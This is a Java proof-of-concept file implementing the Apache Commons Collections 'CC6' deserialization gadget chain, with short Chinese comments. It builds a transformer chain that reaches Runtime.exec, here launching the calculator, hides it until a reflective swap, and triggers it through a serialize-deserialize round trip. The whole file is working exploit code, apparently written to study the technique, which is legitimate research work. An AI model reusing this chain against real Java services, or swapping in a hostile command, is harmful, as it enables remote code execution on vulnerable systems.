package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] fakeFormer = new Transformer[]{new ConstantTransformer(1)};
        // 第一层
        Transformer[] tfs = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(fakeFormer);
        Map lazyMap = LazyMap.decorate(new HashMap<>(),transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
        Map tiedMap = new HashMap<>();
        tiedMap.put(tiedMapEntry,"Exp");
        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMap);
        lazyMap.remove("key");
//        反射修改变量
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, tfs);

        // 测试
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashSet);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
